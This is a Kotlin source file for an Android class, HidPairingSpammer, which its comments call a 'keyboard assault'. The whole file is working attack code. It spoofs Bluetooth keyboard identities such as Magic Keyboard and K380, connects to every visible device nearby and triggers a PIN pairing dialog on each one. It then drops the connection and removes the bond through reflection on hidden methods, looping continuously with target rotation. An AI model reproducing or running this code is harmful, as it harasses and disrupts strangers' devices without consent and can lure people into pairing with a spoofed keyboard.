package com.sunfeld.smsgateway

import android.bluetooth.BluetoothAdapter
import android.bluetooth.BluetoothDevice
import android.bluetooth.BluetoothHidDevice
import android.bluetooth.BluetoothHidDeviceAppSdpSettings
import android.bluetooth.BluetoothManager
import android.bluetooth.BluetoothProfile
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.os.Build
import android.util.Log
import androidx.annotation.RequiresApi
import androidx.core.content.ContextCompat
import kotlinx.coroutines.*
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.StateFlow
import kotlinx.coroutines.flow.asStateFlow

/**
 * HID Keyboard Pairing Assault — masquerades as a Bluetooth keyboard and
 * connects to every visible device. The target sees a PIN pairing dialog
 * ("Keyboard wants to pair — enter PIN: XXXXXX"). The moment we confirm
 * the dialog is showing (via ACTION_PAIRING_REQUEST), we rip the connection
 * away and move to the next target.
 *
 * Flow per target:
 * 1. Set adapter name to a convincing keyboard profile (Magic Keyboard, K380, etc.)
 * 2. Register HID keyboard app with matching SDP settings
 * 3. hidDevice.connect(target) — triggers PIN pairing dialog on victim
 * 4. Wait for ACTION_PAIRING_REQUEST (confirms dialog rendered)
 * 5. IMMEDIATELY disconnect + cancelBondProcess + removeBond
 * 6. Rotate keyboard profile, move to next target
 *
 * Supports dynamic target feeding — new devices are picked up automatically
 * as they're discovered during continuous scan.
 */
@RequiresApi(Build.VERSION_CODES.P)
class HidPairingSpammer {

    companion object {
        private const val TAG = "HidKeyboardAssault"

        // How long to wait for the target to show the PIN dialog
        const val TARGET_TIMEOUT_MS = 6_000L
        // Settle time after disconnecting before moving to next target
        private const val SETTLE_MS = 300L
        // Time to wait for HID profile proxy to connect
        private const val PROXY_WAIT_MS = 3000L
        // Time to wait for HID app registration callback
        private const val REGISTER_WAIT_MS = 1500L
        // Cooldown before re-hitting the same device (seconds)
        private const val REHIT_COOLDOWN_MS = 30_000L

        // All keyboard profiles for rotation
        val KEYBOARD_PROFILES: List<DeviceProfile> = DeviceProfiles.ALL
    }

    private val scope = CoroutineScope(SupervisorJob() + Dispatchers.IO)

    // --- Public state ---
    private val _hitCount = MutableStateFlow(0)
    val hitCount: StateFlow<Int> = _hitCount.asStateFlow()

    private val _skippedCount = MutableStateFlow(0)
    val skippedCount: StateFlow<Int> = _skippedCount.asStateFlow()

    private val _totalAttempts = MutableStateFlow(0)
    val totalAttempts: StateFlow<Int> = _totalAttempts.asStateFlow()

    private val _targetsInRange = MutableStateFlow(0)
    val targetsInRange: StateFlow<Int> = _targetsInRange.asStateFlow()

    private val _currentTarget = MutableStateFlow<String?>(null)
    val currentTarget: StateFlow<String?> = _currentTarget.asStateFlow()

    private val _currentProfile = MutableStateFlow<String?>(null)
    val currentProfile: StateFlow<String?> = _currentProfile.asStateFlow()

    private val _isRunning = MutableStateFlow(false)
    val isRunning: StateFlow<Boolean> = _isRunning.asStateFlow()

    private val _lastError = MutableStateFlow<String?>(null)
    val lastError: StateFlow<String?> = _lastError.asStateFlow()

    // --- Internal state ---
    private var adapter: BluetoothAdapter? = null
    private var originalAdapterName: String? = null
    private var hidDevice: BluetoothHidDevice? = null
    private var registered = false
    private var proxyReady = false
    private var spamJob: Job? = null
    private var pairingReceiver: BroadcastReceiver? = null
    private var appContext: Context? = null
    private var profileIndex = 0

    // Dynamic target list — updated externally as new devices are discovered
    private val targetDevices = mutableListOf<BluetoothDevice>()
    private val targetLock = Any()

    // Track when each device was last hit to avoid hammering
    private val lastHitTime = mutableMapOf<String, Long>()

    // Event-driven: receiver signals this when ACTION_PAIRING_REQUEST fires
    @Volatile private var currentTargetAddress: String? = null
    private var pairingDeferred: CompletableDeferred<Int>? = null

    private val hidCallback = object : BluetoothHidDevice.Callback() {
        override fun onAppStatusChanged(pluggedDevice: BluetoothDevice?, reg: Boolean) {
            Log.d(TAG, "HID app registered=$reg device=${pluggedDevice?.address}")
            registered = reg
        }

        override fun onConnectionStateChanged(device: BluetoothDevice, state: Int) {
            val stateName = when (state) {
                BluetoothProfile.STATE_CONNECTED -> "CONNECTED"
                BluetoothProfile.STATE_DISCONNECTED -> "DISCONNECTED"
                BluetoothProfile.STATE_CONNECTING -> "CONNECTING"
                BluetoothProfile.STATE_DISCONNECTING -> "DISCONNECTING"
                else -> "UNKNOWN($state)"
            }
            Log.d(TAG, "HID ${device.address} -> $stateName")
        }

        override fun onGetReport(device: BluetoothDevice, type: Byte, id: Byte, bufferSize: Int) {
            hidDevice?.replyReport(device, type, id, ByteArray(8))
        }
    }

    private val profileListener = object : BluetoothProfile.ServiceListener {
        override fun onServiceConnected(profile: Int, proxy: BluetoothProfile) {
            if (profile == BluetoothProfile.HID_DEVICE) {
                Log.d(TAG, "HID_DEVICE proxy connected")
                hidDevice = proxy as BluetoothHidDevice
                proxyReady = true
            }
        }

        override fun onServiceDisconnected(profile: Int) {
            if (profile == BluetoothProfile.HID_DEVICE) {
                Log.w(TAG, "HID_DEVICE proxy disconnected")
                hidDevice = null
                proxyReady = false
                registered = false
            }
        }
    }

    /**
     * Start the keyboard assault. Targets are fed dynamically via [updateTargets].
     */
    fun start(context: Context, initialTargets: List<BluetoothDevice> = emptyList()) {
        if (_isRunning.value) return

        appContext = context.applicationContext
        _isRunning.value = true
        _hitCount.value = 0
        _skippedCount.value = 0
        _totalAttempts.value = 0
        _lastError.value = null
        _currentTarget.value = null
        _currentProfile.value = null
        profileIndex = 0
        lastHitTime.clear()

        synchronized(targetLock) {
            targetDevices.clear()
            targetDevices.addAll(initialTargets)
            _targetsInRange.value = targetDevices.size
        }

        val btManager = context.getSystemService(Context.BLUETOOTH_SERVICE) as? BluetoothManager
        adapter = btManager?.adapter

        if (adapter == null || adapter?.isEnabled != true) {
            _lastError.value = "Bluetooth not available"
            _isRunning.value = false
            return
        }

        try {
            originalAdapterName = adapter?.name
        } catch (_: SecurityException) { }

        registerPairingReceiver(context)
        adapter?.getProfileProxy(context, profileListener, BluetoothProfile.HID_DEVICE)

        CrashLogger.log(context, TAG, "Keyboard assault started: ${initialTargets.size} initial targets")

        spamJob = scope.launch {
            // Wait for HID proxy
            val deadline = System.currentTimeMillis() + PROXY_WAIT_MS
            while (!proxyReady && System.currentTimeMillis() < deadline) {
                delay(100)
            }
            if (!proxyReady) {
                _lastError.value = "HID proxy timeout"
                Log.e(TAG, "HID proxy did not connect in time")
                return@launch
            }

            Log.d(TAG, "HID proxy ready — beginning assault loop")

            // Main loop — continuously cycle through all known targets
            while (isActive) {
                val targets = synchronized(targetLock) { targetDevices.toList() }
                _targetsInRange.value = targets.size

                if (targets.isEmpty()) {
                    delay(500) // wait for devices to appear
                    continue
                }

                for (device in targets) {
                    if (!isActive) break

                    // Skip if we hit this device recently
                    val lastHit = lastHitTime[device.address] ?: 0
                    if (System.currentTimeMillis() - lastHit < REHIT_COOLDOWN_MS) {
                        continue
                    }

                    try {
                        assaultTarget(device)
                    } catch (e: Exception) {
                        Log.w(TAG, "Target ${device.address} error: ${e.message}")
                    }
                    _totalAttempts.value++
                    delay(SETTLE_MS)
                }

                // Brief pause before cycling back to the start
                delay(500)
            }
        }
    }

    /**
     * Feed new devices to the assault. Called as scan discovers new targets.
     * Thread-safe — can be called from any thread.
     */
    fun updateTargets(devices: List<BluetoothDevice>) {
        synchronized(targetLock) {
            val existingAddresses = targetDevices.map { it.address }.toSet()
            val newDevices = devices.filter { it.address !in existingAddresses }
            if (newDevices.isNotEmpty()) {
                targetDevices.addAll(newDevices)
                _targetsInRange.value = targetDevices.size
                Log.d(TAG, "Targets updated: +${newDevices.size} new, ${targetDevices.size} total")
            }
        }
    }

    /**
     * Core per-target flow: register as keyboard → connect → wait for PIN dialog →
     * immediately cancel and move on.
     */
    private suspend fun assaultTarget(device: BluetoothDevice) {
        val hid = hidDevice ?: return
        val address = device.address
        val profile = nextProfile()

        _currentTarget.value = address
        _currentProfile.value = profile.sdpName

        try {
            // Set adapter name to this keyboard profile
            try {
                adapter?.setName(profile.sdpName)
            } catch (_: SecurityException) { }

            // Register HID app with this profile's SDP
            val sdpSettings = BluetoothHidDeviceAppSdpSettings(
                profile.sdpName,
                profile.sdpDescription,
                profile.sdpProvider,
                BluetoothHidDevice.SUBCLASS1_KEYBOARD,
                HidKeyReport.KEYBOARD_DESCRIPTOR
            )

            if (registered) {
                try { hid.unregisterApp(); registered = false; delay(50) }
                catch (_: Exception) { }
            }

            try {
                hid.registerApp(sdpSettings, null, null, { it.run() }, hidCallback)
            } catch (e: SecurityException) {
                Log.e(TAG, "[$address] SecurityException registering HID", e)
                _skippedCount.value++
                return
            }

            val regDeadline = System.currentTimeMillis() + REGISTER_WAIT_MS
            while (!registered && System.currentTimeMillis() < regDeadline) { delay(50) }
            if (!registered) {
                Log.w(TAG, "[$address] HID registration timeout")
                _skippedCount.value++
                return
            }

            // Clear existing bond state
            when (device.bondState) {
                BluetoothDevice.BOND_BONDED -> { removeBond(device); delay(100) }
                BluetoothDevice.BOND_BONDING -> { cancelBond(device); delay(100) }
            }

            // Set up the deferred BEFORE connecting
            currentTargetAddress = address
            pairingDeferred = CompletableDeferred()

            // Connect as HID keyboard — this triggers the PIN pairing dialog
            Log.d(TAG, "[$address] Connecting as '${profile.sdpName}'")
            try {
                hid.connect(device)
            } catch (e: SecurityException) {
                Log.e(TAG, "[$address] SecurityException on connect", e)
                _skippedCount.value++
                return
            }

            // Wait for ACTION_PAIRING_REQUEST — proves the target is showing the dialog
            val pairingVariant = try {
                withTimeout(TARGET_TIMEOUT_MS) {
                    pairingDeferred!!.await()
                }
            } catch (_: TimeoutCancellationException) {
                -1
            }

            if (pairingVariant >= 0) {
                // Confirmed — target showed the keyboard pairing dialog
                _hitCount.value++
                lastHitTime[address] = System.currentTimeMillis()
                val variantName = when (pairingVariant) {
                    0 -> "PIN_ENTRY"
                    1 -> "PASSKEY"
                    2 -> "NUMERIC_COMPARISON"
                    3 -> "CONSENT"
                    else -> "VARIANT_$pairingVariant"
                }
                Log.d(TAG, "[$address] CONFIRMED as '${profile.sdpName}' ($variantName) — ripping connection")
            } else {
                _skippedCount.value++
                Log.d(TAG, "[$address] No response within ${TARGET_TIMEOUT_MS}ms — skipped")
            }

            // Immediately rip it away — disconnect, cancel, remove
            try { hid.disconnect(device) } catch (_: Exception) { }
            delay(50)
            cancelBond(device)
            removeBond(device)

        } catch (e: SecurityException) {
            Log.w(TAG, "[$address] SecurityException", e)
            _skippedCount.value++
        } catch (e: Exception) {
            Log.w(TAG, "[$address] Error: ${e.message}", e)
            _skippedCount.value++
        } finally {
            currentTargetAddress = null
            pairingDeferred = null
            _currentTarget.value = null
            _currentProfile.value = null
        }
    }

    private fun nextProfile(): DeviceProfile {
        val profile = KEYBOARD_PROFILES[profileIndex % KEYBOARD_PROFILES.size]
        profileIndex++
        return profile
    }

    private fun cancelBond(device: BluetoothDevice) {
        try {
            device.javaClass.getMethod("cancelBondProcess").invoke(device)
        } catch (_: Exception) { }
    }

    private fun removeBond(device: BluetoothDevice) {
        try {
            device.javaClass.getMethod("removeBond").invoke(device)
        } catch (_: Exception) { }
    }

    private fun registerPairingReceiver(context: Context) {
        pairingReceiver = object : BroadcastReceiver() {
            override fun onReceive(ctx: Context, intent: Intent) {
                if (intent.action == BluetoothDevice.ACTION_PAIRING_REQUEST) {
                    val device = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                        intent.getParcelableExtra(BluetoothDevice.EXTRA_DEVICE, BluetoothDevice::class.java)
                    } else {
                        @Suppress("DEPRECATION")
                        intent.getParcelableExtra(BluetoothDevice.EXTRA_DEVICE)
                    }
                    val variant = intent.getIntExtra(BluetoothDevice.EXTRA_PAIRING_VARIANT, -1)
                    Log.d(TAG, "ACTION_PAIRING_REQUEST from ${device?.address} variant=$variant")

                    // Signal the waiting coroutine if this is our current target
                    if (device?.address == currentTargetAddress) {
                        pairingDeferred?.complete(variant)
                    }
                }
            }
        }

        val filter = IntentFilter(BluetoothDevice.ACTION_PAIRING_REQUEST).apply {
            priority = IntentFilter.SYSTEM_HIGH_PRIORITY
        }
        try {
            ContextCompat.registerReceiver(
                context,
                pairingReceiver!!,
                filter,
                ContextCompat.RECEIVER_EXPORTED
            )
        } catch (e: Exception) {
            Log.w(TAG, "Failed to register pairing receiver: ${e.message}")
        }
    }

    fun stop(context: Context) {
        Log.d(TAG, "Stopping keyboard assault (confirmed=${_hitCount.value} skipped=${_skippedCount.value})")
        _isRunning.value = false
        spamJob?.cancel()
        spamJob = null
        currentTargetAddress = null
        pairingDeferred?.cancel()
        pairingDeferred = null
        _currentTarget.value = null
        _currentProfile.value = null

        if (registered) {
            try { hidDevice?.unregisterApp() } catch (_: Exception) { }
            registered = false
        }

        hidDevice?.let { hid ->
            adapter?.closeProfileProxy(BluetoothProfile.HID_DEVICE, hid)
        }
        hidDevice = null
        proxyReady = false

        originalAdapterName?.let { name ->
            try { adapter?.setName(name) } catch (_: SecurityException) { }
        }

        pairingReceiver?.let {
            try { context.unregisterReceiver(it) } catch (_: Exception) { }
        }
        pairingReceiver = null

        synchronized(targetLock) { targetDevices.clear() }
        lastHitTime.clear()

        CrashLogger.log(context, TAG, "Keyboard assault stopped: ${_hitCount.value} confirmed, ${_skippedCount.value} skipped")
    }
}
